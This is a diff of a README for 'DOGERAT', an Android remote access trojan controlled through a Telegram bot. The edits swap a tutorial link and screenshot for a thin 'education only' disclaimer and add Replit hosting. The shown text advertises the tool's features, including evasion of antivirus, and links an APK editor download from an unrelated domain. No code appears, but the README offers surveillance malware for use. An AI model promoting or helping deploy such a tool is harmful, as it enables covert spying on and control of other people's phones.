@@ -6,10 +6,8 @@
 #                     DOGERAT
 
 A multifunctional Telegram based Android RAT  without port forwarding.
-- VIDEO TUTORIALS  AVIALBLE HERE
-https://shivaya-dav.github.io/dogeweb/
-## Panel Screenshot
-![Logo](https://999xprofit.com/dogs/scr.jpg)
+## disclaimer ☠️☠️
+this tool make for education perpach only. don't misuse this tool for any illegal activity. if you do this for your responsibility
 ## Features
  - 🔴 Real time
 - 🌐 custom web view
@@ -34,7 +32,7 @@ https://shivaya-dav.github.io/dogeweb/
 - ✨ Beautiful telegram bot interface
 -🤖 Undetectable by antivirus
 ## Requirements
- - Glitch Account
+ - Glitch Account or Replit 
  - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
 [ApkTool Editor](https://999xprofit.com/dogs/apkeditor.apk) ( for Android)
 
